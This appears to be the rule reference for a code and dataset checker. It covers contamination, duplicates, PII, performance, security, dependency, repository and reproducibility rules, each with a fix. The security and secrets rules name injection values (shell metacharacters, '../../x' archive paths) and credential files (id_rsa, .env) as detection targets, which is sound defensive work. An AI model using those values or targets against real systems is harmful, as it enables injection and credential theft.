### DS-CONTAM-001: Benchmark item present in the data (Snap)

Snap was asked, for batches of up to 56 benchmark items at once, whether each item appears in the data copied, reworded, translated or as solution only. A score is the model's probability for the whole window, not proof: the report lists the window range, 13-gram corroboration and, when localisation worked, a ~2 KB snippet. HIGH when score >= 0.8, MEDIUM otherwise. --contam-mode prefiltered only sends records sharing several rare words with some item; that drops paraphrases that share few words, and its recall loss has not been measured on real data yet, so exhaustive is the default.

**Fix:** Read the snippet. If real, remove the matching records from the training data and retrain or re-evaluate.

### DS-CONTAM-002: Benchmark n-gram overlap with the data

Local check. An item is flagged when its whole text, a 13-gram or an 8-gram also occurs in a dataset record (lower-cased word tokens). Exact or half the 13-grams matching is HIGH, any 13-gram MEDIUM, 8-gram only LOW. Items shorter than 8 words (13 for the 13-gram test) are blind to n-gram matching and are counted separately.

**Fix:** Deduplicate the training data against the benchmark and drop the matching records.

### DS-DUP-001: Exact duplicate records

Records whose normalised text (lower-case word tokens) is identical. Duplicates over-weight some examples and inflate memorisation and eval scores when they straddle splits.

**Fix:** Keep one copy of each.

### DS-DUP-002: Near-duplicate records

Records with estimated word-3-shingle Jaccard similarity >= --dup-threshold, found with MinHash (64 permutations) and LSH buckets. The similarity is an estimate (about +-0.06).

**Fix:** Review clusters; keep one representative.

### DS-HYG-001: Empty or NaN fields

Fields that are null, blank, or the strings nan/null/none.

**Fix:** Fill or drop.

### DS-HYG-002: Inconsistent keys across records

Some records have a different key set than the most common one.

**Fix:** Normalise the schema.

### DS-HYG-003: Duplicate ids

The same --id-field value appears on several records.

**Fix:** Make ids unique or merge.

### DS-HYG-004: Length outliers

Records longer than Q3 + 3*IQR (or shorter than Q1 - 3*IQR) in characters. Needs >= 20 records.

**Fix:** Inspect; truncate or drop.

### DS-HYG-005: Mojibake or encoding errors

**Fix:** Re-decode the source with the right encoding.

### DS-HYG-006: Label imbalance

With --label-field: majority class above 90% or largest/smallest class ratio >= 10.

**Fix:** Rebalance or use class weights.

### DS-HYG-007: Label shift between dataset and eval

Total variation distance of the label distributions >= 0.15, or classes present in only one split.

**Fix:** Stratify the split.

### DS-HYG-008: Truncated records

Unparsable JSONL lines (typically a cut-off file) or >= 10 records (and >= 5%) with exactly the maximal length of >= 128 chars (a hard truncation limit).

**Fix:** Re-export the data; check the truncation limit.

### DS-HYG-009: Mixed languages or scripts

A second script/language (stop-word heuristic for Latin text, script ranges otherwise) covers >= 5% of classified records.

**Fix:** Confirm the mix is intended or filter.

### DS-IMG-001: Near-duplicate images

dHash (9x8 grayscale) Hamming distance <= 4 between images of the dataset.

**Fix:** Keep one per cluster.

### DS-IMG-002: Image leak between dataset and eval

An eval image is a near-duplicate (dHash <= 4) of a dataset image, or --id-regex ids are shared across splits.

**Fix:** Split by id.

### DS-IMG-003: Corrupt, blank or tiny images

Pillow cannot decode the file, the pixel standard deviation is ~0, or a side is under 32 px.

**Fix:** Remove or re-export.

### DS-LEAK-001: Eval record present exactly in the dataset

A record of --eval has identical normalised text to a dataset record, so eval scores are inflated.

**Fix:** Remove it from one split.

### DS-LEAK-002: Eval record is a near-duplicate of a dataset record

Estimated Jaccard >= --dup-threshold between an eval record and a dataset record.

**Fix:** Remove or re-split.

### DS-LEAK-003: Same ids in dataset and eval

--id-field values or --id-regex matches on file names occur in both splits (for example the same video or channel).

**Fix:** Split by id (group split), not by record.

### DS-LIC-001: Licence not allowed or restrictive licence text

Metadata licence/source not in --allowed-licenses, restrictive wording found by a local pattern, or (Snap) a sampled window that states a non-commercial, no-derivatives or all-rights-reserved licence.

**Fix:** Check the source terms before training or release.

### DS-PII-001: Personal data or secrets in records

Emails, phone numbers, IBANs and credit cards (checksum validated), government-id-like numbers (US SSN, Turkish TC kimlik with checksum), public IPv4 addresses, API keys, private keys and tokens. Matches are masked: first 4 characters plus length. Severity: secrets HIGH, financial/government ids MEDIUM, email/phone/IP LOW.

**Fix:** Redact or drop the records; rotate leaked secrets.

### OPT-ML-001: Host synchronization inside a training loop

`.item()`, `.cpu()`, `.numpy()` and `float(tensor)` wait for the GPU to finish all queued work, stalling the pipeline every step.

**Fix:** Accumulate on the device (`running += loss.detach()`) and sync only every N steps or at epoch end.

### OPT-ML-002: DataLoader without worker / pinned-memory settings

`num_workers=0` loads data in the training process, starving the GPU; without `pin_memory=True` host-to-device copies cannot overlap; without `persistent_workers=True` workers restart every epoch.

**Fix:** Set `num_workers` (4-8), `pin_memory=True` and `persistent_workers=True` (needs num_workers > 0).

### OPT-ML-003: Training loop without mixed precision

No `torch.autocast` / AMP found in a file with a training loop; fp32-only training leaves tensor-core throughput and memory on the table.

**Fix:** Wrap the forward pass in `torch.autocast(device_type, dtype=torch.bfloat16)` (plus GradScaler for fp16).

### OPT-ML-004: Evaluation code without `torch.no_grad()` / `inference_mode()`

Without it autograd records a graph for every forward pass, wasting memory and time.

**Fix:** Decorate with `@torch.inference_mode()` or wrap the loop in `with torch.no_grad():`.

### OPT-ML-005: Python loop over tensor elements

Iterating elements of a tensor in Python runs one tiny op per element (and a sync on GPU); vectorized ops are orders of magnitude faster.

**Fix:** Express the computation with tensor operations, `torch.where`, `index_select`, or batched matmul.

### OPT-ML-006: Tensor created on CPU every step, then moved to the device

`torch.zeros(...).to(device)` allocates on the host and copies each step.

**Fix:** Create directly on the device: `torch.zeros(..., device=device)`, or hoist the constant out of the loop.

### OPT-ML-007: `.to(device)` without `non_blocking=True` while using pinned memory

With `pin_memory=True` the copy can be asynchronous, but only if `non_blocking=True` is passed.

**Fix:** Use `batch.to(device, non_blocking=True)`.

### OPT-ML-008: `torch.cuda.synchronize()` inside a loop

Forces the CPU to wait for the GPU every iteration, destroying asynchronous overlap. It belongs in benchmark timing only.

**Fix:** Remove it, or synchronize once around the timed region.

### OPT-ML-009: Checkpoint saved on every step

Serializing model and optimizer state every iteration makes I/O dominate training time.

**Fix:** Guard with `if step % N == 0` or save once per epoch / on best validation score.

### OPT-ML-010: `optimizer.zero_grad()` without `set_to_none=True`

Setting grads to zero writes memory each step; `set_to_none=True` skips that and lets the allocator reuse buffers (default only since PyTorch 2.0).

**Fix:** Call `optimizer.zero_grad(set_to_none=True)`.

### OPT-ML-011: Depthwise / grouped convolution (AMD ROCm slow path)

`groups=in_channels` convolutions hit a very slow kernel on AMD RDNA3/ROCm (measured about 500x slower than dense on a 7900 XT) and are memory-bound on many GPUs. A dense conv with more FLOPs can still be much faster in wall-clock time.

**Fix:** Benchmark a dense conv (groups=1) on the target hardware; keep depthwise only if measured faster.

### OPT-ML-012: `cudnn.benchmark = True` with dynamic input shapes

cuDNN autotunes per input shape; variable shapes retrigger the autotuner constantly, which is slower than leaving it off.

**Fix:** Enable it only for fixed shapes, or pad / bucket inputs to a few sizes.

### OPT-ML-013: float64 tensors created from numpy / explicit double

numpy defaults to float64; `torch.from_numpy(np.zeros(...))` yields a double tensor that is 2x memory and far slower on most GPUs.

**Fix:** Pass `dtype=np.float32` / `torch.float32`, or call `.float()` once on load.

### OPT-PY-001: String rebuilt by concatenation in a loop

Strings are immutable: `s += x` or `s = s + x` copies the whole string each iteration, so the loop is quadratic in output size. The same applies to `lst = lst + [x]` (a list `+=` extends in place and is fine).

**Fix:** Collect parts in a list and `''.join(parts)` once; use `lst.append` / `lst.extend`.

### OPT-PY-002: Regular expression with a constant pattern used inside a loop

`re.compile` in a loop recompiles every time; `re.match/search/sub/...` with a constant pattern pays a cache lookup per call and hides that the pattern never changes.

**Fix:** Hoist `PATTERN = re.compile(...)` to module level and call `PATTERN.match(...)` in the loop.

### OPT-PY-003: Membership test against a list inside a loop

`x in some_list` scans the list, O(n) per test, so the loop is O(n*m). A set or dict answers in O(1).

**Fix:** Build `set(some_list)` once before the loop (when the items are hashable).

### OPT-PY-004: `for i in range(len(x))` index loop

Index loops are slower than direct iteration and invite off-by-one errors.

**Fix:** Use `for item in x`, `enumerate(x)` or `zip(a, b)`.

### OPT-PY-005: Loop-invariant file opened or read on every iteration

Opening and reading the same path each iteration repeats system calls and parsing for identical data.

**Fix:** Read the file once before the loop and reuse the content.

### OPT-PY-006: Sort inside a loop

Sorting a loop-invariant (or incrementally grown) collection on every iteration costs O(n log n) per pass.

**Fix:** Sort once after the loop, or keep it ordered with `bisect.insort` / `heapq`.

### OPT-PY-007: Blocking call inside `async def`

`time.sleep`, `requests.*`, `urlopen` and `subprocess.run` block the event loop, freezing every other task while they wait.

**Fix:** Use `await asyncio.sleep`, an async client (httpx.AsyncClient, aiohttp), `asyncio.create_subprocess_exec`, or `asyncio.to_thread`.

### OPT-PY-008: Database query inside a loop (N+1)

One `execute` per item costs one round trip per item; latency multiplies by the number of items.

**Fix:** Fetch everything in one query (`WHERE id IN (...)`, a JOIN) or use `executemany` for writes.

### OPT-PY-009: pandas `iterrows()` / `apply(axis=1)`

Both run a Python-level function per row and build a Series per row; typically 10-1000x slower than vectorized operations.

**Fix:** Use vectorized column arithmetic, `np.where`, `merge`, or `itertuples()` if a loop is unavoidable.

### OPT-PY-010: Same JSON/pickle/YAML file parsed in every iteration

`json.load(open(path))` with a path that does not change inside the loop re-reads and re-parses identical data.

**Fix:** Load once before the loop.

### OPT-PY-011: `lru_cache(maxsize=None)` / `cache` on a method

The cache is keyed on `self`, so it holds a strong reference to every instance ever used and never evicts: a memory leak.

**Fix:** Cache a module-level function keyed on the needed arguments, or use a bounded `maxsize`, or store the cache on the instance.

### OPT-PY-012: `list(...)` copy wrapped in sum/any/all/min/max

These builtins accept any iterable; materializing a list first allocates memory and defeats short-circuiting of any/all.

**Fix:** Pass the generator or iterable directly: `any(f(x) for x in xs)`.

### OPT-PY-013: `list.pop(0)` / `list.insert(0, x)` in a loop

Both shift every element, so the loop is quadratic.

**Fix:** Use `collections.deque` (`popleft`, `appendleft`) or iterate with an index.

### OPT-SNAP-001: Same expensive computation repeated across modules

Snap question: is it true that the same expensive computation (parsing, feature extraction, model forward pass, big aggregation) is performed independently in several functions or modules instead of once and shared? Redundant work multiplies runtime. Compute once and pass the result, or memoize.

**Fix:** Compute once and pass the result, or memoize.

### OPT-SNAP-002: Per-item network call hidden behind helper functions

Snap question: is it true that a function that makes an HTTP/RPC call is itself called once per item inside a loop elsewhere (N+1 requests hidden behind a function boundary)? Latency is paid per item. Batch the requests, use bulk endpoints, or run them concurrently.

**Fix:** Batch the requests, use bulk endpoints, or run them concurrently.

### OPT-SNAP-003: Per-item database query hidden behind helper functions

Snap question: is it true that a function that runs a database query is called once per item in a loop elsewhere (N+1 queries hidden behind a function boundary)? One round trip per row. Fetch in bulk with IN/JOIN or prefetch relations.

**Fix:** Fetch in bulk with IN/JOIN or prefetch relations.

### OPT-SNAP-004: Missing caching where inputs repeat

Snap question: is it true that a pure or slow function is called repeatedly with the same arguments (e.g. lookups, parsing, remote fetches) and its results are not cached? Repeated identical work. Add functools.lru_cache (on functions, not methods) or a small dict cache.

**Fix:** Add functools.lru_cache (on functions, not methods) or a small dict cache.

### OPT-SNAP-005: Unbatched per-item model inference

Snap question: is it true that a machine-learning model, embedding or LLM is called on one item at a time inside a loop where batching the inputs would be possible? Per-item inference wastes accelerator throughput. Batch inputs.

**Fix:** Batch inputs.

### OPT-SNAP-006: Synchronous I/O on a hot path

Snap question: is it true that request handlers, event loops or per-item processing functions perform blocking file, network or subprocess I/O synchronously? Blocking I/O serializes the hot path. Use async I/O, a thread pool, or move it off the hot path.

**Fix:** Use async I/O, a thread pool, or move it off the hot path.

### OPT-SNAP-007: Unnecessary data copies

Snap question: is it true that large data structures (lists, arrays, dataframes, bytes) are copied, deep-copied or converted back and forth where a view or in-place operation would do? Copies cost time and memory. Use views, in-place ops, memoryview or iterate lazily.

**Fix:** Use views, in-place ops, memoryview or iterate lazily.

### OPT-SNAP-008: Unbounded growth of in-memory structures

Snap question: is it true that module-level or long-lived lists, dicts or caches grow with every request or item and are never evicted, trimmed or bounded? Memory grows until the process dies. Bound with LRU/maxlen/TTL.

**Fix:** Bound with LRU/maxlen/TTL.

### OPT-SNAP-009: Polling loop without backoff

Snap question: is it true that a loop repeatedly polls a resource (file, endpoint, queue, flag) with no sleep, no backoff, or a very short fixed sleep? Busy polling burns CPU and load. Use events/conditions, blocking reads, or exponential backoff.

**Fix:** Use events/conditions, blocking reads, or exponential backoff.

### OPT-SNAP-010: Configuration re-read on every call

Snap question: is it true that a configuration file, environment, or settings object is read and parsed inside a function that is called frequently instead of once at startup? Repeated I/O and parsing of constant data. Load once and pass or cache it.

**Fix:** Load once and pass or cache it.

### OPT-SNAP-011: Whole file or table loaded when streaming would do

Snap question: is it true that an entire large file, query result or dataset is read into memory at once (read(), readlines(), fetchall(), read_csv) only to be processed item by item? Peak memory scales with input size. Stream or chunk.

**Fix:** Stream or chunk.

### OPT-SNAP-012: Quadratic string or list rebuilding across calls

Snap question: is it true that large strings or lists are repeatedly rebuilt by concatenation or copying, e.g. accumulated across recursive or repeated function calls? Each rebuild copies everything so far. Use join, extend, or generators.

**Fix:** Use join, extend, or generators.

### OPT-SNAP-013: Expensive object recreated per call

Snap question: is it true that expensive objects (HTTP sessions, database connections, clients, compiled regexes, loaded models, tokenizers) are created inside functions called many times rather than once and reused? Setup cost is paid on every call. Create once (module level or injected) and reuse.

**Fix:** Create once (module level or injected) and reuse.

### OPT-SNAP-014: In-process serialization round trips

Snap question: is it true that data is serialized and immediately deserialized inside the same process (json.dumps then loads, pickle round trips) for copying or passing between functions? Pure overhead. Pass the object directly.

**Fix:** Pass the object directly.

### OPT-SNAP-015: Sequential independent I/O that could be concurrent

Snap question: is it true that several independent network or disk operations are awaited or executed one after another in sequence when they could run concurrently? Total time is the sum instead of the max. Use asyncio.gather, a thread pool, or batch calls.

**Fix:** Use asyncio.gather, a thread pool, or batch calls.

### OPT-SNAP-016: Unbounded query or listing without pagination

Snap question: is it true that queries or API listings fetch every row or object (no LIMIT, no pagination, .all()) before filtering in Python? Transfers and holds more than needed. Filter and paginate server-side.

**Fix:** Filter and paginate server-side.

### OPT-SNAP-017: Quadratic algorithm spread across helpers

Snap question: is it true that a helper that scans a whole collection linearly (search, membership, count, index) is called inside a loop over a similarly sized collection, making the algorithm quadratic? O(n*m) hidden by function boundaries. Index with a dict/set first.

**Fix:** Index with a dict/set first.

### OPT-SNAP-018: Expensive logging or printing in hot loops

Snap question: is it true that logging, printing or debug formatting happens inside tight per-item loops, with arguments formatted eagerly even when the level is disabled? I/O and string formatting dominate. Use lazy %-style logging args, log every N items.

**Fix:** Use lazy %-style logging args, log every N items.

### OPT-SNAP-019: Coarse locking around slow work

Snap question: is it true that a global or coarse lock is held while doing slow work (I/O, model calls, computation), serializing otherwise parallel threads? Contention removes parallelism. Narrow the critical section.

**Fix:** Narrow the critical section.

### OPT-SNAP-020: Unbuffered or tiny reads and writes

Snap question: is it true that files are read or written in tiny pieces (byte by byte, line by line with flush on every write, unbuffered mode)? Syscall overhead dominates. Use buffered I/O and larger chunks.

**Fix:** Use buffered I/O and larger chunks.

### OPT-SNAP-021: Preprocessing repeated every epoch or request

Snap question: is it true that deterministic preprocessing (tokenization, decoding, resizing, feature extraction) is recomputed on every epoch or request instead of being cached or precomputed? Same work repeated. Cache preprocessed data to disk or memory.

**Fix:** Cache preprocessed data to disk or memory.

### OPT-SNAP-022: Heavy work inside the training step

Snap question: is it true that file decoding, tokenization, image loading or other CPU preprocessing is done synchronously in the main training/inference process instead of in data-loader workers? The accelerator idles while the CPU prepares data. Move it into dataset workers or precompute.

**Fix:** Move it into dataset workers or precompute.

### OPT-SNAP-023: Retries without backoff or limit

Snap question: is it true that retry loops re-attempt failing operations immediately, forever, or without jitter? Retry storms amplify outages. Cap attempts and use exponential backoff with jitter.

**Fix:** Cap attempts and use exponential backoff with jitter.

### OPT-SNAP-024: Heavy imports or model loads at call time

Snap question: is it true that heavy modules are imported or models are loaded inside functions that run repeatedly? Import and load cost on every call. Import at module level, load once.

**Fix:** Import at module level, load once.

### OPT-SNAP-025: List used for hot lookups

Snap question: is it true that lists or arrays are used for frequent membership or key lookups where a set or dict would be much faster? Linear scans per lookup. Use set/dict.

**Fix:** Use set/dict.

### OPT-SNAP-026: Row-wise dataframe work hidden behind helpers

Snap question: is it true that helper functions apply row-by-row pandas operations (apply, iterrows, per-row loc/iloc) that are called on whole dataframes? Per-row Python overhead. Vectorize.

**Fix:** Vectorize.

### OPT-SNAP-027: Repeated full sort or scan for min/max/top-k

Snap question: is it true that collections are fully sorted or scanned repeatedly just to get the minimum, maximum or top-k items? O(n log n) per query. Use heapq/min/max or keep a sorted structure.

**Fix:** Use heapq/min/max or keep a sorted structure.

### OPT-SNAP-028: Accumulating tensors with autograd history or unclosed resources

Snap question: is it true that values that keep references to large objects accumulate in lists (e.g. appending loss tensors with their graph, unclosed files, sessions or handles) so memory grows over time? Memory leak. Append `.item()` / `.detach()` and close handles with `with`.

**Fix:** Append `.item()` / `.detach()` and close handles with `with`.

### OPT-SNAP-029: Temporary files written and re-read in the same process

Snap question: is it true that data is written to temporary files or disk caches and read back by the same process where it could stay in memory? Disk round trip. Keep it in memory or use a pipe.

**Fix:** Keep it in memory or use a pipe.

### OPT-SNAP-030: Blocking calls reachable from async code across modules

Snap question: is it true that async functions call helpers (in other modules) that block with synchronous I/O or sleep, stalling the event loop? Blocks every concurrent task. Make the helper async or run it in a thread.

**Fix:** Make the helper async or run it in a thread.

| `SEC-010` | MEDIUM | no | tar/zip extractall without member filtering (path traversal) |
| `SEC-011` | HIGH | no | SQL built with string formatting |
| `SEC-012` | HIGH | no | Flask/Django app run with debug=True |
| `SEC-013` | MEDIUM | no | Binding to 0.0.0.0 |

### SEC-001: Unsafe deserialization (pickle / torch.load without weights_only)

pickle, dill, marshal and `torch.load` with the default (or `weights_only=False`) execute arbitrary code embedded in the file. A downloaded checkpoint or a cached object is enough for remote code execution.

**Fix:** Use `torch.load(path, weights_only=True)`, safetensors, or JSON; only unpickle data you produced and signed.

### SEC-002: yaml.load without a safe loader

`yaml.load` with the default or `Loader=yaml.Loader/UnsafeLoader/FullLoader` can construct arbitrary Python objects from the document.

**Fix:** Use `yaml.safe_load(...)` or pass `Loader=yaml.SafeLoader`.

### SEC-003: eval / exec on a non-constant expression

`eval` and `exec` run whatever string they are given; if any part comes from input, files or the network it is code injection.

**Fix:** Use `ast.literal_eval` for literals, a dispatch dict for choices, or a real parser.

### SEC-004: subprocess with shell=True and a formatted command string

With `shell=True` the command goes through the shell; f-strings, `%`, `.format` or `+` put variables into it, so a value containing `;` or `$(...)` runs extra commands.

**Fix:** Pass a list of arguments without `shell=True` (`subprocess.run(["ls", path])`), or `shlex.quote` every inserted value.

### SEC-005: os.system / os.popen

These always go through the shell, so any interpolated value is a command-injection risk and errors are easy to ignore.

**Fix:** Use `subprocess.run([...], check=True)` with an argument list.

### SEC-006: Hard-coded secret or token

Credentials in source end up in version control, logs and container images. The report shows only the first 4 characters and the length.

**Fix:** Move it to an environment variable or secret manager, remove it from history and rotate it now.

### SEC-007: tempfile.mktemp

`mktemp` returns a name without creating the file, so another process can create it first (race, symlink attack).

**Fix:** Use `tempfile.mkstemp`, `NamedTemporaryFile` or `TemporaryDirectory`.

### SEC-008: TLS verification disabled (verify=False)

`requests`/`httpx` with `verify=False` accept any certificate, so a man-in-the-middle can read and alter the traffic.

**Fix:** Remove `verify=False`; to trust a private CA pass `verify="/path/ca.pem"`.

### SEC-009: assert used to validate input

`assert` is stripped when Python runs with `-O`, so a check on function arguments silently disappears.

**Fix:** Raise `ValueError` / `TypeError` explicitly for validation; keep `assert` for internal invariants and tests.

### SEC-010: tar/zip extractall without member filtering (path traversal)

Archive members named `../../x` or absolute paths can write outside the target directory. `tarfile.extractall` is only safe with `filter="data"` (3.12+).

**Fix:** Use `tar.extractall(dest, filter="data")`, or check each member's resolved path stays inside `dest` before extracting.

### SEC-011: SQL built with string formatting

Formatting values into a query with f-strings, `%`, `.format` or `+` allows SQL injection.

**Fix:** Use placeholders: `cur.execute("SELECT * FROM t WHERE id = ?", (x,))` (or `%s` with the driver).

### SEC-012: Flask/Django app run with debug=True

The Werkzeug debugger exposes an interactive console that gives code execution to anyone who can reach the port.

**Fix:** Read the flag from the environment and keep it off in production; use a WSGI server.

### SEC-013: Binding to 0.0.0.0

Listening on all interfaces exposes the service to the whole network, often unintentionally on shared or cloud machines.

**Fix:** Bind to `127.0.0.1` unless remote access is intended; then put it behind auth and a firewall.

### SEC-014: Weak hash (md5 / sha1)

MD5 and SHA-1 have practical collisions and are far too fast for passwords.

**Fix:** Use `hashlib.sha256`/`blake2b` for integrity, `hashlib.scrypt` / argon2 / bcrypt for passwords; `usedforsecurity=False` marks a non-security use.

### SEC-015: World-writable file permissions (chmod)

Mode bits like 0o777 or 0o666 let any local user modify the file, enabling tampering or privilege escalation.

**Fix:** Use 0o600 for private files, 0o644 / 0o755 for public ones.

| `DEP-011` | MEDIUM | no | Pinned version older than the recommended minimum (heuristic) |
| `DEP-012` | LOW | no | No Python version constraint |

### DEP-001: Dependency has no version constraint

Any release, including a future breaking or compromised one, satisfies the requirement, so two installs of the same repo can differ.

**Fix:** Pin it (`pkg==1.2.3`) or at least bound it (`pkg>=1.2,<2`); lock the full tree with pip-tools, uv or poetry.

### DEP-002: Dependency only has a lower bound

`>=` without an upper bound lets a new major release break the build silently.

**Fix:** Add an upper bound (`>=1.2,<2`), use a compatible release (`~=1.2`), or pin exactly.

### DEP-003: Conflicting specs for the same package across files

The same package is declared with different constraints in different manifests, so the environment depends on which file was installed last.

**Fix:** Keep one source of truth (e.g. pyproject.toml) and generate the other files from it.

### DEP-004: Package declared twice in the same file

A duplicate entry is at best noise and at worst two different constraints where only one wins.

**Fix:** Remove the duplicate.

### DEP-005: Imported package has no declared dependency

Code imports a third-party module that no manifest lists; a clean install will fail with ImportError. The import-name to package-name mapping is a small built-in table plus name normalization, so exotic packages can be false positives.

**Fix:** Add the package to the manifest (or, if it is a local module, ignore this finding).

### DEP-006: Declared dependency is never imported

Nothing in the scanned code imports it. It may be dead weight, a plugin or CLI tool used indirectly, or its import name differs from its package name.

**Fix:** Remove it if unused; keep it and ignore the finding if it is a plugin or tool.

### DEP-007: Git dependency without a pinned commit

A `git+` URL with no ref, or a branch/tag ref, resolves to whatever is there at install time; history can be rewritten or the repo taken over.

**Fix:** Pin a full commit hash: `git+https://host/org/repo.git@<40-hex-sha>`.

### DEP-008: Plain http:// index or package URL

Packages fetched over http can be tampered with in transit and run arbitrary code on install.

**Fix:** Use https:// URLs.

### DEP-009: Extra package index (dependency-confusion risk)

With `--extra-index-url`, pip takes the highest version from ANY index, so an attacker can publish a higher version of an internal package name on PyPI.

**Fix:** Use a single `--index-url` that proxies PyPI, or pin hashes (`--require-hashes`).

### DEP-010: TLS verification disabled for a package host

`--trusted-host` (or `verify_ssl = false`) turns off certificate checks for that host.

**Fix:** Remove it and fix the certificate instead.

### DEP-011: Pinned version older than the recommended minimum (heuristic)

HEURISTIC: a small built-in table of minimum recommended versions (see MIN_VERSIONS in checksnap/checks/deps/__init__.py) for popular packages; older pins miss years of security and compatibility fixes. The table is hand-maintained, not a vulnerability database.

**Fix:** Upgrade to a maintained release, or ignore if you deliberately support an old platform.

### DEP-012: No Python version constraint

No `requires-python`, `python_requires`, Pipfile `python_version`, `python` entry or .python-version was found, so installs on unsupported interpreters are not rejected.

**Fix:** Set `requires-python = ">=3.10"` in pyproject.toml (or the equivalent for your manifest).

### REPO-001: Large file (over 50 MB) not covered by .gitignore

Git stores every version of a file forever; one big blob makes every clone slow and hosts like GitHub reject pushes above 100 MB.

**Fix:** Add it to .gitignore, or track it with Git LFS / DVC and keep only a pointer in the repo.

### REPO-002: Model or data artifact not covered by .gitignore

Checkpoints and data dumps (.pt, .ckpt, .safetensors, .h5, .npy, .parquet, .zip ...) are large, binary and change often, so they bloat history.

**Fix:** Ignore the file or its directory, and distribute it through a release, object store, Git LFS or DVC.

### REPO-003: No .gitignore

Without one, caches, virtualenvs, secrets and build output are one `git add .` away from being committed.

**Fix:** Add a .gitignore (for Python: __pycache__/, .venv/, .env, runs/, data/).

### REPO-004: Common paths present but not ignored

__pycache__, .env, .venv, runs/ or data/ exist in the tree and no .gitignore rule covers them.

**Fix:** Add the listed entries to .gitignore.

### REPO-005: Secrets file in the tree and not ignored

Files such as .env, id_rsa, *.pem or credentials.json hold credentials; once committed they stay in history even after deletion.

**Fix:** Ignore the file, rotate the credential if it was ever committed, and ship a .env.example instead.

### REPO-006: No README

A README is the first thing a reader looks for: what this is, how to run it.

**Fix:** Add README.md.

### REPO-007: No LICENSE

Without a license, nobody else may legally reuse the code.

**Fix:** Add a LICENSE file (see choosealicense.com).

### REPO-008: Jupyter notebook with large saved outputs

Embedded images and tables make notebooks huge, produce unreadable diffs and leak whatever the cells printed.

**Fix:** Clear outputs before committing (`jupyter nbconvert --clear-output --inplace`, or nbstripout as a git filter).

### REPO-009: Broken symlink

The link points at a target that does not exist, so tools that follow it fail.

**Fix:** Remove it or fix its target.

### REPO-010: Duplicate files (identical content)

Identical copies waste space and drift apart when only one is edited.

**Fix:** Keep one copy and reference it (import, symlink, config path).

### REPO-011: Filenames that differ only by case

On case-insensitive filesystems (macOS, Windows) these collide and one silently overwrites the other at checkout.

**Fix:** Rename one of them.

### REPO-012: Very long path (over 200 characters)

Windows tools historically fail above 260 characters, and checkouts under a deep directory push paths over that limit.

**Fix:** Shorten directory or file names.

### REPO-013: Mixed CRLF and LF line endings in one file

Mixed endings cause whole-file diffs, noisy blame and shell scripts that fail with `\r: command not found`.

**Fix:** Normalize to LF and add a .gitattributes with `* text=auto`.

### REPO-014: Leftover merge-conflict markers

`<<<<<<<` / `>>>>>>>` blocks mean a merge was committed unresolved; the file is probably broken.

**Fix:** Resolve the conflict and remove the markers.

### REPO-015: TODO / FIXME comments

Counts open markers so the number can be tracked; not a defect by itself.

**Fix:** Turn important ones into issues.

### REP-001: Python `random` used but never seeded

The `random` module is used and no `random.seed(...)` (or a seed_everything-style helper) exists in the project, so every run draws different numbers.

**Fix:** Call one seed function at program start, e.g. `random.seed(s); np.random.seed(s); torch.manual_seed(s)`, and log `s`.

### REP-002: NumPy randomness used but never seeded

`np.random.*` global functions are used and no `np.random.seed(...)` / seeded `default_rng(seed)` / `RandomState(seed)` exists in the project.

**Fix:** Seed once (`np.random.seed(s)`) or, better, pass an explicit `np.random.default_rng(s)` around.

### REP-003: PyTorch randomness used but never seeded

torch random ops, layer initialisation, dropout or a shuffling DataLoader are used and `torch.manual_seed` is never called, so weights, dropout masks and batch order differ per run.

**Fix:** Call `torch.manual_seed(s)` (it also seeds CUDA) at start.

### REP-004: TensorFlow/Keras randomness used but never seeded

`tf.random.*` or Keras layers are used and no `tf.random.set_seed` / `keras.utils.set_random_seed` exists.

**Fix:** Call `tf.keras.utils.set_random_seed(s)` (seeds python, numpy and TF together).

### REP-005: Seed is set after the random source was already used

In the same scope a random call runs before the seed call, so the first draws (often data splits or weight init) are not reproducible even though a seed exists.

**Fix:** Move the seed call above every use, to the very top of `main()` / the module.

### REP-006: cudnn.benchmark enabled or cudnn.deterministic disabled

`torch.backends.cudnn.benchmark = True` lets cuDNN pick algorithms by timing, which can differ between runs; `deterministic = False` allows non-deterministic kernels explicitly.

**Fix:** Set `cudnn.benchmark = False` and `cudnn.deterministic = True` when reproducibility matters (costs some speed).

### REP-007: PyTorch project never requests deterministic cuDNN

torch randomness is used but nothing sets `torch.backends.cudnn.deterministic = True` or calls `torch.use_deterministic_algorithms`; GPU convolutions can then vary run to run even with a fixed seed.

**Fix:** Add `torch.backends.cudnn.deterministic = True; torch.backends.cudnn.benchmark = False`.

### REP-008: DataLoader without worker_init_fn / generator

A DataLoader that shuffles or uses worker processes but has neither `generator=` nor `worker_init_fn=` leaves shuffling order and per-worker numpy/random state unseeded.

**Fix:** Pass `generator=torch.Generator().manual_seed(s)` and a `worker_init_fn` that seeds numpy/random from `torch.initial_seed()`.

### REP-009: Directory listing / glob used without sorting

`os.listdir`, `os.scandir`, `glob.glob`, `Path.glob/rglob/iterdir` return files in filesystem order, which differs between machines; data order and splits built from it change.

**Fix:** Wrap in `sorted(...)`.

### REP-010: Iteration over a set

Set iteration order depends on hash values; for strings it changes between processes (PYTHONHASHSEED), so anything built in that order (data lists, vocabularies, splits) is not reproducible.

**Fix:** Iterate `sorted(the_set)` or keep an ordered structure (dict / list with de-duplication).

### REP-011: Reliance on hash or unordered-container order

`hash()` of str/bytes is salted per process, `dict.popitem()` depends on insertion history and `set.pop()` / `next(iter(set))` returns an arbitrary element.

**Fix:** Use `hashlib` for stable hashes; pick elements explicitly (`min(s)`, `sorted(s)[0]`).

### REP-012: Wall-clock time used in a path or result name

`datetime.now()` / `time.time()` formatted into a directory, file or run name means each run writes somewhere different and results cannot be located or diffed by configuration.

**Fix:** Derive run names from config + seed (or a git hash); record the timestamp inside the metadata instead.

### REP-013: Unpinned dependencies

Requirements without `==` resolve to whatever is newest at install time, so the same code can behave differently next month.

**Fix:** Pin exact versions (`pip freeze`, `pip-compile`, `uv lock`).

### REP-014: Third-party imports but no dependency manifest

The code imports third-party packages yet there is no requirements.txt, pyproject.toml, environment.yml, Pipfile or setup.py, so nobody can rebuild the environment.

**Fix:** Add a requirements.txt or pyproject.toml, preferably with pinned versions.

### REP-015: No lockfile or fully pinned requirements

A manifest exists but no lock file (poetry.lock, uv.lock, Pipfile.lock, pdm.lock, conda-lock.yml) and no fully pinned requirements file, so transitive dependencies float.

**Fix:** Commit a lock file or a `pip freeze` / `pip-compile` output.

### REP-016: ML code never records the git commit

Training/ML code that does not log the git commit (rev-parse, GitPython, wandb/mlflow/dvc...) makes it impossible to tell which code produced a result.

**Fix:** Save `git rev-parse HEAD` (and whether the tree was dirty) next to every result.

